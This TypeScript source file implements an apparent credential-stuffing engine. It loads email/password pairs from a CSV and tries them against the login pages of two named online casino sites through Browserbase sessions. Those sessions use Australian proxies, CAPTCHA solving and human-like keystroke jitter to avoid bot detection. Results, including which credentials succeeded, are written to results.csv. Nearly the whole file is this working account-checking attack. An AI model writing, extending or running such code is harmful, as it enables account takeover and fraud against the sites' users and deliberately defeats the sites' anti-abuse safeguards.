/**
 * AUTOMATION ENGINE
 * EventEmitter-based core that processes each CSV row through Browserbase.
 * Emits real-time events for the GUI server to relay over WebSocket.
 */

import { EventEmitter } from "events";
import Browserbase from "@browserbasehq/sdk";
import { chromium, type Browser, type Page } from "playwright-core";
import pLimit from "p-limit";
import * as fs from "fs";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface Credential {
  email: string;
  password: string;
}

export interface SiteConfig {
  name: string;
  url: string;
  selectors: {
    username: string;
    password: string;
    submit: string;
  };
}

export type Outcome = "pending" | "running" | "SUCCESS" | "FAILED" | "BLOCKED" | "ERROR";

export interface SiteStatus {
  outcome: Outcome;
  attempts: number;
  error?: string;
}

export interface RowStatus {
  rowIndex: number;
  email: string;
  status: "pending" | "running" | "done" | "skipped";
  sites: { [siteName: string]: SiteStatus };
  sessionId?: string;
  recordingUrl?: string;
}

export interface EngineConfig {
  apiKey: string;
  projectId: string;
  concurrency: number;
  maxRetries: number;
  targets: SiteConfig[];
}

// ─── Default Targets ──────────────────────────────────────────────────────────

export const DEFAULT_TARGETS: SiteConfig[] = [
  {
    name: "joe",
    url: "https://www.joefortunepokies.win/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
  {
    name: "ignition",
    url: "https://www.ignitioncasino.ooo/login",
    selectors: {
      username: "#email",
      password: "#login-password",
      submit: "#login-submit",
    },
  },
];

// Concurrency policy: default 3, absolute max 5 (× 2 sites = 10 max sessions)
const DEFAULT_CONCURRENCY = 3;
const MAX_CONCURRENT_CREDENTIALS = 5;

// ─── Engine ───────────────────────────────────────────────────────────────────

export class AutomationEngine extends EventEmitter {
  private running = false;
  private shouldStop = false;
  private rows: RowStatus[] = [];

  get isRunning(): boolean {
    return this.running;
  }

  get rowStatuses(): RowStatus[] {
    return this.rows;
  }

  /** Parse credentials.csv into credential objects */
  loadCredentials(csvPath: string): Credential[] {
    if (!fs.existsSync(csvPath)) return [];
    const content = fs.readFileSync(csvPath, "utf-8");
    const lines = content
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);

    if (lines.length < 2) return [];

    const headers = lines[0].split(",").map((h) => h.trim());
    const emailIdx = headers.indexOf("email");
    const passIdx = headers.indexOf("password");
    if (emailIdx < 0 || passIdx < 0) return [];

    return lines
      .slice(1)
      .map((line) => {
        const parts = line.split(",").map((p) => p.trim());
        return { email: parts[emailIdx] || "", password: parts[passIdx] || "" };
      })
      .filter((c) => c.email && c.password);
  }

  /** Start the automation loop over all credentials */
  async start(credentials: Credential[], config: EngineConfig): Promise<void> {
    if (this.running) {
      this.log("WARN", "Engine is already running");
      return;
    }

    this.running = true;
    this.shouldStop = false;
    const { targets } = config;

    // Initialise row statuses
    this.rows = credentials.map((c, i) => ({
      rowIndex: i,
      email: c.email,
      status: "pending" as const,
      sites: Object.fromEntries(
        targets.map((t) => [t.name, { outcome: "pending" as Outcome, attempts: 0 }])
      ),
    }));

    this.emit("started", {
      total: credentials.length,
      targets: targets.map((t) => t.name),
    });

    // Clamp concurrency: default 3, absolute max 5 — never exceeded
    const concurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
    this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
    this.log("INFO", `Concurrency: ${concurrency} creds (${concurrency * targets.length} max sessions) | Max retries: ${config.maxRetries}`);

    const bb = new Browserbase({ apiKey: config.apiKey });
    const limit = pLimit(concurrency);

    const tasks = credentials.map((cred, idx) =>
      limit(async () => {
        if (this.shouldStop) {
          this.rows[idx].status = "skipped";
          this.emitRowUpdate(idx);
          return;
        }

        // Mark row as running
        this.rows[idx].status = "running";
        this.emitRowUpdate(idx);
        this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);

        let browser: Browser | null = null;

        try {
          // Create Browserbase session with AU proxy + stealth
          const session = await bb.sessions.create({
            projectId: config.projectId,
            proxies: [
              {
                type: "browserbase",
                geolocation: { country: "AU", city: "Melbourne" },
              },
            ],
            browserSettings: {
              recordSession: true,
              logSession: true,
              solveCaptchas: true,
            },
            keepAlive: true,
          });

          this.rows[idx].sessionId = session.id;
          this.rows[idx].recordingUrl = `https://www.browserbase.com/sessions/${session.id}`;
          this.log("INFO", `  Session: ${session.id}`);

          browser = await chromium.connectOverCDP(session.connectUrl);
          const context = browser.contexts()[0];
          const page = context.pages()[0];
          page.setDefaultTimeout(30000);

          // Process each target site SEQUENTIALLY
          for (const target of targets) {
            if (this.shouldStop) break;

            this.rows[idx].sites[target.name].outcome = "running";
            this.emitRowUpdate(idx);

            let outcome: Outcome = "FAILED";
            let lastError = "";

            for (let attempt = 1; attempt <= config.maxRetries; attempt++) {
              if (this.shouldStop) break;

              this.rows[idx].sites[target.name].attempts = attempt;
              this.emitRowUpdate(idx);
              this.log("INFO", `  ${target.name} attempt ${attempt}/${config.maxRetries}`);

              try {
                const success = await this.executeLogin(page, target, cred);
                if (success) {
                  outcome = "SUCCESS";
                  break;
                }
              } catch (e: any) {
                lastError = e.message || String(e);
                this.log("WARN", `  ${target.name}: ${lastError.substring(0, 100)}`);
              }

              if (attempt < config.maxRetries) {
                await this.sleep(2000 + Math.random() * 2000);
              }
            }

            this.rows[idx].sites[target.name].outcome = outcome;
            if (lastError && outcome !== "SUCCESS") {
              this.rows[idx].sites[target.name].error = lastError;
            }

            const icon = outcome === "SUCCESS" ? "✓" : "✗";
            this.log(
              outcome === "SUCCESS" ? "OK" : "WARN",
              `  ${icon} ${target.name}: ${outcome}`
            );
            this.emitRowUpdate(idx);
          }

          await browser.close();
          browser = null;
        } catch (e: any) {
          this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
          // Mark remaining sites as ERROR
          for (const target of targets) {
            const s = this.rows[idx].sites[target.name];
            if (s.outcome === "pending" || s.outcome === "running") {
              s.outcome = "ERROR";
              s.error = e.message || String(e);
            }
          }
          if (browser) await browser.close().catch(() => {});
        }

        this.rows[idx].status = "done";
        this.emitRowUpdate(idx);
      })
    );

    await Promise.allSettled(tasks);

    // Write results CSV
    this.writeResultsCSV(targets);

    this.running = false;
    this.emit("complete", { rows: this.rows });
    this.log("INFO", "═══ Automation complete ═══");
  }

  /** Gracefully stop the engine after current tasks finish */
  stop(): void {
    if (!this.running) return;
    this.shouldStop = true;
    this.log("WARN", "Stop requested — finishing active sessions...");
    this.emit("stopping");
  }

  // ─── Private ──────────────────────────────────────────────────────────────

  private async executeLogin(
    page: Page,
    site: SiteConfig,
    cred: Credential
  ): Promise<boolean> {
    await page.goto(site.url, { waitUntil: "networkidle", timeout: 30000 });
    await this.sleep(1000 + Math.random() * 1000);

    // Fill email with human-like jitter
    await page.fill(site.selectors.username, "");
    await page.click(site.selectors.username);
    await this.sleep(200 + Math.random() * 300);
    for (const ch of cred.email) {
      await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
    }

    await this.sleep(300 + Math.random() * 400);

    // Fill password
    await page.fill(site.selectors.password, "");
    await page.click(site.selectors.password);
    await this.sleep(200 + Math.random() * 300);
    for (const ch of cred.password) {
      await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
    }

    await this.sleep(300 + Math.random() * 400);

    // Submit
    await page.click(site.selectors.submit);
    await this.sleep(3000 + Math.random() * 2000);

    // Check for success
    const content = await page.content();
    const url = page.url();
    const isSuccess =
      content.includes("dashboard") ||
      content.includes("account") ||
      content.includes("welcome") ||
      content.includes("balance") ||
      content.includes("lobby") ||
      !url.includes("login");

    return isSuccess;
  }

  private writeResultsCSV(targets: SiteConfig[]): void {
    const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
    const lines = [header];
    for (const row of this.rows) {
      for (const target of targets) {
        const s = row.sites[target.name];
        const err = (s.error || "").replace(/"/g, "'").substring(0, 200);
        lines.push(
          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
        );
      }
    }
    fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
    this.log("INFO", `Results saved to results.csv`);
  }

  private emitRowUpdate(idx: number): void {
    // Deep copy to avoid mutation issues
    this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
  }

  private log(level: string, message: string): void {
    this.emit("log", {
      level,
      message,
      timestamp: new Date().toISOString(),
    });
  }

  private sleep(ms: number): Promise<void> {
    return new Promise((r) => setTimeout(r, ms));
  }
}
